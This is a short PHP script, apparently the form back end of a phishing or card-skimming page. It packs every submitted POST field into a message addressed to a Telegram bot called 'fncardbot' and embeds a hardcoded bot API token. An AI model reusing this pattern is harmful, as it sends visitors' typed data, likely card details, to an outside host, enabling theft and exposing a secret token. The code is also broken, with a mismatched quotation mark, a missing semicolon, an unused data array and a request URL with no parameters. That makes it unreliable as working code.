<?php 
$content = '';
foreach ($_POST as $key => $value) {
    if($value) {
        $content .= "<b>$key</b>: <i>$value</i>\n";
    }
}

if(trim($content)){
    
        $content .= "<b>Message from site:"</b>\n".$content;
        $apiToken = "7251900025:AAHh-Vz-KACC9cLbabNPfc07XipT9iw34d8";
        $data = [
        'chat_id' => 'fncardbot',
        'text' => $content,
        'parse_mode' => 'HTML'
        ];
        $respone = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?")
            }
?>
